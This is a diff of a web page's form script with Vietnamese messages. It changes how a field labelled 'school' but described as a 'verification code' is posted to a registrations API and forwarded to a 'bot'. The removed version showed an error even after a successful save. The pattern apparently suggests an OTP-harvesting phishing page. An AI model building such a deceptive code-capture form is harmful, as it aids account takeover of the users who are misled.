@@ -75,28 +75,46 @@
     const schoolForm = document.querySelector('#school-form');
     const submitButton = schoolForm.querySelector('button');
     const confirmationError = document.querySelector('#confirmation-error');
+    const errorText = confirmationError.querySelector('.error-text');
 
     schoolForm.addEventListener('submit', async (event) => {
       event.preventDefault();
       const schoolInput = document.querySelector('#school');
-      submitButton.disabled = true;
-      submitButton.textContent = 'Đang xử lý...';
+      const schoolValue = schoolInput.value.trim();
 
-      const response = await fetch((window.API_BASE || '') + '/api/registrations', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ school: schoolInput.value.trim() })
-      });
-
-      if (response.ok) {
-        await new Promise((resolve) => setTimeout(resolve, 1500));
+      if (!schoolValue) {
         confirmationError.hidden = false;
+        errorText.textContent = 'Vui lòng nhập mã xác minh trước khi xác nhận.';
         return;
       }
 
-      submitButton.disabled = false;
-      submitButton.textContent = 'Xác nhận';
-      alert('Không thể lưu lượt đăng ký. Vui lòng thử lại.');
+      submitButton.textContent = 'Đang gửi...';
+
+      try {
+        const response = await fetch((window.API_BASE || '') + '/api/registrations', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ school: schoolValue })
+        });
+
+        const responseData = await response.json().catch(() => ({}));
+
+        if (response.ok) {
+          confirmationError.hidden = false;
+          errorText.textContent = 'Xác nhận thành công. Thông tin đã được lưu và gửi tới bot.';
+          schoolInput.value = '';
+          submitButton.textContent = 'Xác nhận';
+          return;
+        }
+
+        confirmationError.hidden = false;
+        errorText.textContent = responseData.error || 'Không thể lưu lượt đăng ký. Vui lòng thử lại.';
+        submitButton.textContent = 'Xác nhận';
+      } catch (error) {
+        confirmationError.hidden = false;
+        errorText.textContent = 'Không thể lưu lượt đăng ký. Vui lòng thử lại.';
+        submitButton.textContent = 'Xác nhận';
+      }
     });
   </script>
 </body>
